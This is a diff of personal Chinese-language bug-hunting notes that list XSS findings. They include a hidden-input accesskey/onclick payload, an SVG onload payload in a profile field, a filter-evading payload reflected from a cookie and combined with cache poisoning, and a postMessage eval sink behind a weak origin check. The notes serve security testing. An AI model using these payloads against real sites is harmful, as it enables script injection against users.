@@ -1,4 +1,4 @@
-1.隐藏输入中的xss（绕过输入转义）
+# 1.隐藏输入中的xss（绕过输入转义）
 参数，位于post请求中的listViewHeading=
 有效负载：" accesskey=X onclick=alert()
 ![[Pasted image 20241014211401.png]]
@@ -6,16 +6,16 @@
 ![[Pasted image 20241014211445.png]]
 success
 
-2.个人主页的项目名称中可以插入xsspayload
+# 2.个人主页的项目名称中可以插入xsspayload
 ```
 post
 name="><svg onload="prompt(/xss/);"><!--
 ```
 
-3.二维码xss
+# 3.二维码xss
 二维码执行js
 
-4.cookie里的xss
+# 4.cookie里的xss
 cookie: hav=xxx 反射到页面上
 payload:cookie:  hav=xss"</sc"ript><sv"g/onloa"d=al"ert"(document.do"main)>
 缓存投毒，http响应里的头Cache-Control和Expires表明可以缓存
@@ -38,7 +38,7 @@ Te: trailers
 ```
 .js触发缓存。?xxxd缓存破坏器
 
-5.postmessage相关的xss
+# 5.postmessage相关的xss
 网页存在代码![[Pasted image 20241017232723.png|700]]
 e.data有exec的话就用eval执行代码，这里检查origin，但是不严格
 ```
